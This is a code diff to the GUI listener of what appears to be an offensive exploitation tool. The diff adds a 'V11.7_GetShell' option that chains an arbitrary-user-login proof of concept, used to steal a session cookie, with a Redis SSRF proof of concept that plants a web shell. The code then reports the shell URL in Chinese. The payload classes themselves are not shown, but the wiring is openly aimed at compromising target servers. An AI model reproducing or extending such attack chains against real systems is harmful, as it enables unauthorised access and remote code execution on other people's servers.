@@ -1,8 +1,6 @@
 package com.xinyu.view;
 
-import com.xinyu.poc.ArbitraryFileDeletion;
-import com.xinyu.poc.GetShell;
-import com.xinyu.poc.LocalFileIncludes;
+import com.xinyu.poc.*;
 import com.xinyu.tools.Other;
 
 import javax.swing.*;
@@ -27,7 +25,7 @@ public class GetShellActionListener implements ActionListener {
 
     @Override
     public void actionPerformed(ActionEvent e) {
-        String url = Other.dataCleaning(this.field_url.getText(), Pattern.compile("(https?://.*?)/"));
+        String url = Other.dataCleaning(this.field_url.getText() + "/", Pattern.compile("(https?://.*?)/"));
         String choose = (String) jcomboBox.getSelectedItem();
         String shell_url = null;
         switch (choose) {
@@ -66,6 +64,21 @@ public class GetShellActionListener implements ActionListener {
                     textArea.append("\n利用成功\nSHELL如下:\n" + shell_url);
                 } else {
                     textArea.append("\n利用失败");
+                }
+                break;
+            case "V11.7_GetShell":
+                System.out.println("V11.7_GetShell");
+                textArea.append("\n*******\n正在尝试V11.7_GetShell...");
+                String cookie2 = ArbitraryUserLogin.poc5(url);
+                if (cookie2 != null) {
+                    shell_url = RedisSSRF.poc1(url, cookie2);
+                    if (shell_url != null) {
+                        textArea.append("\n利用成功\nSHELL如下:\n" + shell_url);
+                    } else {
+                        textArea.append("\n利用失败");
+                    }
+                } else {
+                    textArea.append("\n系统当前无在线用户, 未获取到有效Cookie, 利用失败");
                 }
                 break;
             default:
